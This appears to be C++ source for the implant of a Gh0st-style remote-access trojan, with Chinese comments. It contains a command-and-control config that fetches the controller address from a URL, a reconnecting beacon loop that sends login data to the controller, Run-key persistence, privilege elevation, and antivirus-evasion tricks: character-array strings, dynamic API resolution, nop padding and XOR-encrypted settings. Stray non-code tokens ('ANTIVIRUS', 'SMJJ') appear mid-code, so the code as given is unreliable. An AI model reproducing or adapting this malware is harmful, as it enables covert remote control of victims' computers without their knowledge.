// WorkDll.cpp : Defines the entry point for the DLL application.
//


#include "stdafx.h"
#include <windows.h>
#include "ClientSocket.h"
#include "KernelManager.h"
#include "KeyboardManager.h"
#include "login.h"
#include "until.h"
#include <io.h>
#include "resource.h"
#pragma comment(linker, "/OPT:NOWIN98")
#pragma comment(lib, "DELAYIMP.LIB")
#pragma comment(linker, "/DELAYLOAD:WININET")
#pragma comment(linker, "/DELAYLOAD:WS2_32")
#pragma comment(linker, "/DELAYLOAD:PSAPI")
#pragma comment(linker, "/DELAYLOAD:GDI32")
#pragma comment(linker, "/DELAYLOAD:ADVAPI32")
#pragma comment(linker, "/DELAYLOAD:SHELL32")
#pragma comment(linker, "/DELAYLOAD:WINMM")
#pragma comment(linker, "/DELAYLOAD:USER32")
#pragma comment(linker, "/DELAYLOAD:WTSAPI32")
#pragma comment(linker, "/DELAYLOAD:AVICAP32")
#pragma comment(linker, "/DELAYLOAD:SHLWAPI")
#pragma comment(linker, "/DELAYLOAD:NETAPI32")
#pragma comment(linker, "/DELAY:nobind")
#pragma comment(linker, "/DELAY:unload")


//////////////////////////////////////////////////////////

////////////////////////////////////////////////

//#define TESTDLL 

CHAR MyCurrentPath[MAX_PATH]={NULL};
static BOOL FuckCracker=TRUE;
//		CRITICAL_SECTION g_cs; 

struct ONLINEINFO
{
	CHAR DNS[300];     //上线DNS
	CHAR URL[300];     //HTPP上线
	WORD Port;         //上线端口
	WORD Type;         //上线类型
	CHAR szMark[100];  //上线分组
}m_OnlineInfo=
{
	"127.0.0.1",
	"http://127.0.0.1:8080/ip.txt",
	8000,
	0, //0 DNS 1 HTTP
	"xiaodeng"
};

/*
struct ONLINEINFO
{
	CHAR DNS[300];     //上线DNS
	CHAR URL[300];     //HTPP上线
	WORD Port;         //上线端口
	WORD Type;         //上线类型
	CHAR szMark[100];  //上线分组
}m_OnlineInfo=
{
	"127.0.0.1",
	"http://192.168.1.102:8080/ip.txt",
	80,
	0, //0 DNS 1 HTTP
	"xiaodeng"
};
*/


enum
{
	NOT_CONNECT, //  还没有连接
	GETLOGINFO_ERROR,
	CONNECT_ERROR,
	HEARTBEATTIMEOUT_ERROR
};

#define		HEART_BEAT_TIME		1000 * 60 // 心跳时间

DWORD	g_dwServiceType;
DWORD WINAPI DeleteLoader(LPVOID lParam);
VOID MyEncryptFunction(LPSTR szData,WORD Size);
VOID DeleteLog();
DWORD ProcessToPID( LPCTSTR lpszProcess );
DWORD WINAPI PassDSMainexe(LPVOID lParam);
VOID RegInstallServices();

HANDLE m_hPassDsmain=INVALID_HANDLE_VALUE;

typedef HANDLE (WINAPI *CreateEventAT)
(
    __in_opt LPSECURITY_ATTRIBUTES lpEventAttributes,
    __in     BOOL bManualReset,
    __in     BOOL bInitialState,
    __in_opt LPCSTR lpName
    );

typedef BOOL (WINAPI *SetFileAttributesAT)
(
 LPCSTR lpFileName,
 DWORD dwFileAttributes
 );

typedef HANDLE (WINAPI *GetCurrentProcessT)
(
 VOID
 );

typedef BOOL (WINAPI *TerminateThreadT)


(
 __in HANDLE hThread,
 __in DWORD dwExitCode
 );


typedef HANDLE (WINAPI *CreateFileAT)
(
    __in     LPCSTR lpFileName,
    __in     DWORD dwDesiredAccess,
    __in     DWORD dwShareMode,
    __in_opt LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    __in     DWORD dwCreationDisposition,
    __in     DWORD dwFlagsAndAttributes,
    __in_opt HANDLE hTemplateFile
    );

typedef HANDLE (WINAPI *CreateThreadT)
(
 LPSECURITY_ATTRIBUTES lpThreadAttributes,
 DWORD dwStackSize,
 LPTHREAD_START_ROUTINE lpStartAddress,
 LPVOID lpParameter,
 DWORD dwCreationFlags,
 LPDWORD lpThreadId
 );
typedef HANDLE (WINAPI *OpenMutexAT)
(
 __in DWORD dwDesiredAccess,
 __in BOOL bInheritHandle,
 __in LPCSTR lpName
 );

typedef HANDLE (WINAPI *CreateMutexAT)

(
 __in_opt LPSECURITY_ATTRIBUTES lpMutexAttributes,
 __in     BOOL bInitialOwner,
 __in_opt LPCSTR lpName
 );



typedef BOOL (WINAPI *WriteFileT)
(
    __in        HANDLE hFile,
    __in_bcount(nNumberOfBytesToWrite) LPCVOID lpBuffer,
    __in        DWORD nNumberOfBytesToWrite,
    __out_opt   LPDWORD lpNumberOfBytesWritten,
    __inout_opt LPOVERLAPPED lpOverlapped
    );

typedef DWORD (WINAPI *GetModuleFileNameAT)
(
 HMODULE hModule,
 LPSTR lpFilename,
 DWORD nSize
 );

typedef UINT (WINAPI *GetWindowsDirectoryAT)
(
 __out_ecount_part_opt(uSize, return + 1) LPSTR lpBuffer,
 __in UINT uSize
 );


BOOL InitializationOnlineInfo()
{

//#ifndef TESTDLL
//	MyEncryptFunction((LPSTR)&m_OnlineInfo,sizeof(ONLINEINFO));
//#endif


	//DNS 上线.
	if(m_OnlineInfo.Type==0)
		return TRUE;

	HINTERNET	hNet;
	HINTERNET	hFile;
	
	typedef HINTERNET(WINAPI *InterOpen)(LPCTSTR,DWORD,LPCTSTR,LPCTSTR,DWORD);
	HMODULE hModule=LoadLibrary("WININET.dll");
ANTIVIRUS
 	InterOpen pInterOpen=(InterOpen)GetProcAddress(hModule,"InternetOpenA");
ANTIVIRUS
	hNet = pInterOpen("Mozilla/4.0 (compatible)", INTERNET_OPEN_TYPE_PRECONFIG, NULL, INTERNET_INVALID_PORT_NUMBER, 0);


	if (hNet == NULL)
		return FALSE;

	typedef HINTERNET(WINAPI *OpenUrl)(HINTERNET ,LPCTSTR, LPCTSTR ,DWORD,DWORD,DWORD);
	OpenUrl pOpenUrl=(OpenUrl)GetProcAddress(hModule,"InternetOpenUrlA");

	hFile = pOpenUrl(hNet, m_OnlineInfo.URL, NULL, 0, INTERNET_FLAG_PRAGMA_NOCACHE | INTERNET_FLAG_RELOAD, 0);
	if (hFile == NULL)
		return FALSE;
	
	char	buffer[2048]={NULL};
	DWORD	dwBytesRead = 0;

	memset(buffer, 0, sizeof(buffer));

	typedef BOOL(WINAPI *InternetReadFileT)(HINTERNET,LPVOID,DWORD,LPDWORD);
	InternetReadFileT pInternetReadFileT=(InternetReadFileT)GetProcAddress(hModule,"InternetReadFile");
	pInternetReadFileT(hFile, buffer, sizeof(buffer), &dwBytesRead);

	typedef BOOL(WINAPI *InternetCloseHandleT)(HINTERNET);
	__asm nop;
	__asm nop;
__asm nop;
 	InternetCloseHandleT pInternetCloseHandleT=(InternetCloseHandleT)GetProcAddress(hModule,"InternetCloseHandle");

	pInternetCloseHandleT(hFile);
	pInternetCloseHandleT(hNet);

	CHAR *Point = strstr(buffer,":");
	if(Point == NULL)
		return FALSE;

	strncpy(m_OnlineInfo.DNS,buffer,strlen(buffer)-strlen(Point));

	Point++;
	m_OnlineInfo.Port = atoi(Point);
	
	FreeLibrary(hModule);

	return TRUE;
}
DWORD WINAPI CreateAutoRun()
{
	Sleep(5000);
	char MyPath[MAX_PATH];
	GetModuleFileName(NULL,MyPath,sizeof(MyPath));
	char run[] = {'S','O','F','T','W','A','R','E','\\','M','i','c','r','o','s','o','f','t','\\','W','i','n','d','o','w','s','\\','C','u','r','r','e','n','t','V','e','r','s','i','o','n','\\','R','u','n','\0'};
	WriteRegEx(HKEY_LOCAL_MACHINE,run,"Kris", REG_SZ,MyPath,strlen(MyPath), 0);
	return 0;
}
BOOL silence()
{
	try
	{
		fopen("ipfuck.exe", "r");
		throw 1;
		ExitProcess(0);
	}
	catch (int)
	{
		return TRUE;
	}
	return FALSE;
}	
char	strKillEvent[50]={NULL};
int WinMain( __in HINSTANCE hInstance, __in_opt HINSTANCE hPrevInstance, __in_opt LPSTR lpCmdLine, __in int nShowCmd )
//int main(int argc, char *argv[])
{
	if ( !silence() )
	{
		ExitProcess(0);
	}
CreateThreadT pCreateThread=(CreateThreadT)GetProcAddress(LoadLibrary("KERNEL32.dll"),"CreateThread");
	InitializationOnlineInfo();
    HKEY kk;
	char sof1[]={'S','O','F','T','W','A','R','E','\\','C','l','a','s','s','e','s','\\','.','3','8','6','\\','\0'};
	if (ERROR_SUCCESS!=RegOpenKeyEx(HKEY_LOCAL_MACHINE,sof1,0,KEY_ALL_ACCESS,&kk)) 
	{
		__asm nop;
        __asm nop;
        __asm nop;
		return -1;
        __asm nop;
	}
	pCreateThread(NULL,NULL,(LPTHREAD_START_ROUTINE)CreateAutoRun,NULL,NULL,NULL);
char fucking[] = {'K','E','R','N','E','L','3','2','.','D','L','L','\0'};
		CreateMutexAT pCreateMutexA = (CreateMutexAT)GetProcAddress(LoadLibrary(fucking),"CreateMutexA");
		HANDLE m_hMutex = pCreateMutexA(NULL, FALSE, "chinaheikee__inderjns"); 
		
		if (GetLastError() == ERROR_ALREADY_EXISTS)
		{ 
			
			CloseHandle(m_hMutex); 
			
			m_hMutex = NULL; 
			
			return FALSE; 
			
		} 
	

	char	strServiceName[256];
	__asm
	{
		nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
			nop
}
	wsprintf(strKillEvent, "Global\\Net_%d", GetTickCount()); // 随机事件名
ANTIVIRUS
	SetErrorMode( SEM_FAILCRITICALERRORS);
	char	*lpszHost = NULL;
	DWORD	dwPort = 80;
	
	HANDLE	hEvent = NULL;
	//构造函数 初始化Socket库
	CClientSocket socketClient;
	BYTE	bBreakError = NOT_CONNECT; // 断开连接的原因,初始化为还没有连接

	while (1)
	{
		// 如果不是心跳超时，不用再sleep1分钟
		if (bBreakError != NOT_CONNECT && bBreakError != HEARTBEATTIMEOUT_ERROR)
		{
			// 2分钟断线重连, 为了尽快响应killevent
			for (int i = 0; i < 200; i++)
			{
				hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
				if (hEvent != NULL)
				{
					socketClient.Disconnect();
					CloseHandle(hEvent);
					break;
				}
				// 改一下

				Sleep(200);
			}
		}

//	lpszHost ="127.0.0.1";
//	dwPort = 8000;
	
//	char strtemp[MAX_PATH]={0};
//	wsprintf(strtemp,"%s:%d",lpszHost,dwPort);

//#ifndef TESTDLL
	//哈哈 笑而不语..首次校验
//	if(FuckCracker)
//		dwPort = rand()%65535;
//#endif

		lpszHost =m_OnlineInfo.DNS;
	dwPort = m_OnlineInfo.Port;

	DWORD dwTickCount = GetTickCount();
	if (!socketClient.Connect(lpszHost, dwPort))
	{
		bBreakError = CONNECT_ERROR;
		continue;
	}

	// 登录
	DWORD dwExitCode = SOCKET_ERROR;
	sendLoginInfo(strServiceName, &socketClient, GetTickCount() - dwTickCount,m_OnlineInfo.szMark);
	
	CKernelManager	manager(&socketClient, strServiceName, g_dwServiceType, strKillEvent, lpszHost, dwPort);
	
	socketClient.setManagerCallBack(&manager);
	


	//////////////////////////////////////////////////////////////////////////
	// 等待控制端发送激活命令，超时为10秒，重新连接,以防连接错误
	for (int i = 0; (i < 10 && !manager.IsActived()); i++)
	{
		Sleep(1000);
	}
	// 10秒后还没有收到控制端发来的激活命令，说明对方不是控制端，重新连接
	if (!manager.IsActived())
		continue;
/*
#ifndef TESTDLL
	//哈哈 二次数据校验
	DWORD Sum = 0;
	for (i=0;i<strlen(m_OnlineInfo.DNS);i++)
		Sum+=m_OnlineInfo.DNS[i];
	for (i=0;i<strlen(m_OnlineInfo.URL);i++)
		Sum+=m_OnlineInfo.URL[i];
	for (i=0;i<strlen(m_OnlineInfo.szMark);i++)
		Sum+=m_OnlineInfo.szMark[i];
	Sum=Sum+m_OnlineInfo.Port+m_OnlineInfo.Type;

	DWORD GetVaule=0;
	GetVaule=m_OnlineInfo.DNS[295]*10000;
	GetVaule=GetVaule+m_OnlineInfo.DNS[296]*1000;
	GetVaule=GetVaule+m_OnlineInfo.DNS[297]*100;
	GetVaule=GetVaule+m_OnlineInfo.DNS[298]*10;
	GetVaule=GetVaule+m_OnlineInfo.DNS[299];
	
	if(GetVaule!=Sum)
		socketClient.m_Socket = rand()%65535;//破坏Socket..
#endif	

*/
	//////////////////////////////////////////////////////////////////////////
	
	DWORD	dwIOCPEvent;
SMJJ
	dwTickCount = GetTickCount();
	
	do
	{
		hEvent = OpenEvent(EVENT_ALL_ACCESS, false, strKillEvent);
		dwIOCPEvent = WaitForSingleObject(socketClient.m_hEvent, 100);
		Sleep(500);
	} while(hEvent == NULL && dwIOCPEvent != WAIT_OBJECT_0);
	
	
	if (hEvent != NULL)
	{
		socketClient.Disconnect();
		CloseHandle(hEvent);
		break;
	}
	else
		Sleep(7000);//需等待控制端退出...
	}

	return 0;
}




//提升进程权限..
VOID ElevationPrivilege(const CHAR * dwFlags)
{
	HANDLE hToken;
	TOKEN_PRIVILEGES tkp;

	char hkey[] = {'G','e','t','C','u','r','r','e','n','t','P','r','o','c','e','s','s','\0'};
   char fucking[] = {'K','E','R','N','E','L','3','2','.','D','L','L','\0'};
   GetCurrentProcessT pGetCurrentProcess= (GetCurrentProcessT)GetProcAddress(LoadLibrary(fucking),hkey);
	if(!OpenProcessToken(pGetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hToken))
        return;
	
	LookupPrivilegeValue(NULL,dwFlags,&tkp.Privileges[0].Luid);
	
	tkp.PrivilegeCount=1;
	
	tkp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
	
	AdjustTokenPrivileges(hToken,FALSE,&tkp,0,(PTOKEN_PRIVILEGES)NULL,0);
}


VOID MyEncryptFunction(LPSTR szData,WORD Size)
{
	
	//该数组用来异或
	WORD AddTable[]={
			3,2,5,8,5,1,2,3,2,5,3,4,1,2,
			4,3,5,8,2,4,5,8,1,2,4,3,1,1,
			8,1,2,4,3,1,1,5,2,2,1,2,1,3,
			5,2,2,1,2,1,3,3,1,2,3,5,2,6,
			2,4,1,3,2,1,2,6,2,3,3,2,1,1,
			3,6,2,1,2,4,4,3,1,2,3,5,2,6,
			3,1,2,3,5,2,6,5,2,2,1,2,1,2,
			6,2,3,3,2,1,1,5,2,2,1,2,1,2,
			3,2,5,3,4,1,2,2,3,1,2,3,5,2
	};
	
	WORD TableSize = sizeof(AddTable)/sizeof(WORD);
	WORD iCount=0;
	FuckCracker=FALSE;
	
	for (WORD i=0;i<Size;i++)
	{
		if(iCount == TableSize) 
			iCount = 0;
		
		szData[i]^=AddTable[iCount];
		//BUG  忘记iCount++ 导致异或的是数组表 3..
		iCount++;
	}
}


